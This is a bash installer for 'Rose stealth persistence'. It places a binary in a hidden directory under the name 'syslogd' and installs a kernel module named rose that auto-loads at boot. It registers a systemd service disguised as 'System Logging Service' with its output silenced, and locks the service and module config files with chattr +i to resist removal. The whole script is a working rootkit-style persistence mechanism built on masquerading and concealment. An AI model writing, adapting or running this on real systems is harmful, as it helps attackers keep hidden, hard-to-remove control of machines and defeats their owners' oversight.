#!/bin/bash
# Rose stealth persistence — proper metode:
#   1. Kernel module via module tree + modules-load.d  (auto-load saat boot)
#   2. Honeypotd daemon via systemd service (Type=simple, foreground)
#   3. Tidak pakai ExecStartPre background hack

ROOT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
HIDDEN_DIR="/sylph_data/.sys"
MODULE_NAME="rose"
MODULE_DEST="/lib/modules/$(uname -r)/kernel/drivers/misc/${MODULE_NAME}.ko"
MODULES_LOAD_CONF="/etc/modules-load.d/${MODULE_NAME}.conf"
SERVICE_NAME="rose-honeypotd.service"
SERVICE_PATH="/etc/systemd/system/${SERVICE_NAME}"

# ============================================================
# 1. Hidden directory
# ============================================================
mkdir -p "$HIDDEN_DIR"

# ============================================================
# 2. Honeypotd binary → hidden directory
#    Makefile build target: sylph_honeypotd/honeypotd.bin
# ============================================================
HONEYPOTD_SRC="$ROOT_DIR/sylph_honeypotd/honeypotd.bin"
if [ ! -f "$HONEYPOTD_SRC" ]; then
    echo "[-] honeypotd.bin not found, building..."
    make -C "$ROOT_DIR" sylph_honeypotd/honeypotd.bin 2>/dev/null || {
        echo "[-] Build failed. Check dependencies (libcurl)."
        exit 1
    }
fi
cp "$HONEYPOTD_SRC" "$HIDDEN_DIR/syslogd"
chmod 755 "$HIDDEN_DIR/syslogd"

# ============================================================
# 3. Kernel module → kernel module tree + depmod
# ============================================================
if [ ! -f "$ROOT_DIR/${MODULE_NAME}.ko" ]; then
    echo "[-] ${MODULE_NAME}.ko not found, building..."
    make -C "$ROOT_DIR" 2>/dev/null || {
        echo "[-] Build failed."
        exit 1
    }
fi

cp "$ROOT_DIR/${MODULE_NAME}.ko" "$HIDDEN_DIR/${MODULE_NAME}.ko"
chmod 600 "$HIDDEN_DIR/${MODULE_NAME}.ko"

# Install ke kernel module tree agar bisa modprobe
mkdir -p "$(dirname "$MODULE_DEST")"
cp "$ROOT_DIR/${MODULE_NAME}.ko" "$MODULE_DEST"
chmod 644 "$MODULE_DEST"
depmod -a

# ============================================================
# 4. modules-load.d — auto-load module saat boot
# ============================================================
echo "$MODULE_NAME" > "$MODULES_LOAD_CONF"

# ============================================================
# 5. Systemd service untuk honeypotd daemon (foreground)
#    Type=simple → systemd keep process alive
#    ExecStartPre loading module (fallback kalo modules-load.d gagal)
# ============================================================
cat > "$SERVICE_PATH" << 'SERVICEEOF'
[Unit]
Description=System Logging Service
After=local-fs.target
Before=syslog.target

[Service]
Type=simple
ExecStartPre=/sbin/modprobe rose
ExecStart=/sylph_data/.sys/syslogd
Restart=on-failure
RestartSec=10
KillMode=control-group
TimeoutStopSec=3
SendSIGKILL=yes
Nice=-5
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
SERVICEEOF

chmod 644 "$SERVICE_PATH"

# ============================================================
# 6. Enable & start
# ============================================================
systemctl daemon-reload
systemctl enable "$SERVICE_NAME" 2>/dev/null || true

# Load module sekarang
modprobe "$MODULE_NAME" 2>/dev/null || insmod "$HIDDEN_DIR/${MODULE_NAME}.ko" 2>/dev/null || true

# Start service sekarang
systemctl restart "$SERVICE_NAME" 2>/dev/null || \
    "$HIDDEN_DIR/syslogd" -d 2>/dev/null &

# 7. Kunci file konfigurasi biar ga gampang dihapus
chattr +i "$SERVICE_PATH" 2>/dev/null || true
chattr +i "$MODULES_LOAD_CONF" 2>/dev/null || true

echo "[+] Rose persistence installed."
echo "[+] Module  : $MODULE_DEST (auto-load via modules-load.d)"
echo "[+] Service : $SERVICE_NAME (systemd)"
echo "[+] Binary  : $HIDDEN_DIR/syslogd"
echo ""
echo "   systemctl status $SERVICE_NAME"
echo "   systemctl cat $SERVICE_NAME"



